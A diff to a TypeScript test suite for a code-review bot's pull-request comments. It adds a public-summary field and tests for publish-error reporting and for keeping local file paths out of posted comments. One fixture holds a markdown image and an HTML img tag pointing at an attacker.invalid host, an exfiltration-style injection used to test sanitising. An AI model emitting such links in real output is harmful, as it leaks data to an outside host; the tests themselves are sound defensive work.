@@ -122,7 +122,7 @@ describe('shared review PR comment', () => {
 
   it('still publishes the summary of a review that completed', () => {
     const body = renderGateComment({
-      status: 'fail', risk: 'high', summary: 'One verified race in the scheduler.',
+      status: 'fail', risk: 'high', summary: 'One verified race in the scheduler.', publicSummary: 'One verified race in the scheduler.',
       identity: { headSha: 'a'.repeat(40), baseSha: 'b'.repeat(40) },
       accounts: { codex: { label: 'sparey8' } },
     });
@@ -244,6 +244,8 @@ describe('shared review PR comment', () => {
       status: 'fail',
       risk: 'high',
       summary: 'Leak ![payload](https://attacker.invalid/secret)\n<img src="https://attacker.invalid/raw">',
+      // A review's public summary carries the model's text as its summary does.
+      publicSummary: 'Leak ![payload](https://attacker.invalid/secret)\n<img src="https://attacker.invalid/raw">',
       identity: { headSha: 'a'.repeat(40), baseSha: 'b'.repeat(40) },
       findings: [{
         disposition: 'verified', priority: 'P2', file: 'src/safe.ts', line: 1,
@@ -377,6 +379,62 @@ describe('shared review PR comment', () => {
         repository: context.repository, baseSha: pr.baseRefOid, headSha: pr.headRefOid, policyDigest: context.policy.policyDigest,
       });
       expect((await readOutcome(context.paths, identity))?.result?.summary).toContain(leak);
+    }
+  });
+
+  it('reaches every pull request and reports the publish error when the events folder cannot be written', async () => {
+    const context = await makeContext();
+    // A file stands where the events folder should be: every event write fails.
+    await rm(context.paths.events, { recursive: true, force: true });
+    await writeFile(context.paths.events, 'not a folder');
+    const first = pullRequest();
+    const second = { ...pullRequest(), number: first.number + 1, headRefOid: 'd'.repeat(40) };
+    const identityOf = (pr: ReturnType<typeof pullRequest>) => attestationIdentity({
+      repository: context.repository, baseSha: pr.baseRefOid, headSha: pr.headRefOid, policyDigest: context.policy.policyDigest,
+    });
+    const publish = vi.fn(async (_root: string, _slug: string, number: number) => {
+      if (number === first.number) return { changed: true, commentId: 1 };
+      throw new Error('GitHub refused the comment');
+    });
+    const runGate = vi.fn(async (options: { head: string }) => ({
+      status: 'fail', identity: identityOf(options.head === first.headRefOid ? first : second), risk: 'high', summary: 'Verified failure.', findings: [],
+    }));
+    await expect(syncPullRequests({
+      context,
+      runGate,
+      listPullRequests: async () => [first, second],
+      ensureCommit: vi.fn(async () => {}),
+      resolveMergeBase: vi.fn(async (_repo, base) => base),
+      publish,
+    })).rejects.toThrow(/could not publish 1 comment\(s\): PR #\d+: GitHub refused the comment/);
+    expect(publish).toHaveBeenCalledTimes(2);
+  });
+
+  it('publishes a stored failing outcome with its public summary, never its local one', async () => {
+    const context = await makeContext();
+    const pr = pullRequest();
+    const identity = attestationIdentity({
+      repository: context.repository, baseSha: pr.baseRefOid, headSha: pr.headRefOid, policyDigest: context.policy.policyDigest,
+    });
+    const runGate = vi.fn(async () => ({
+      status: 'fail', identity, risk: 'high', findings: [],
+      summary: 'One defect. Deterministic lanes — eslint: eslint exited with code 2 at C:/Users/example/AppData/Local/Temp/rove-review-q.',
+      publicSummary: 'One defect. Deterministic lanes — eslint: error.',
+    }));
+    const publish = vi.fn(async () => ({ changed: false }));
+    const dependencies = {
+      context, runGate, listPullRequests: async () => [pr], ensureCommit: vi.fn(async () => {}),
+      resolveMergeBase: vi.fn(async (_repo, base) => base), publish,
+    };
+    await syncPullRequests(dependencies);
+    await syncPullRequests(dependencies);
+    // The second publish comes from the stored outcome, not a new review.
+    expect(runGate).toHaveBeenCalledTimes(1);
+    expect(publish).toHaveBeenCalledTimes(2);
+    for (const call of publish.mock.calls) {
+      const body = renderGateComment(call[3]);
+      expect(body).not.toContain(githubText('rove-review-q', 100));
+      expect(body).toContain(githubText('eslint: error', 100));
     }
   });
 
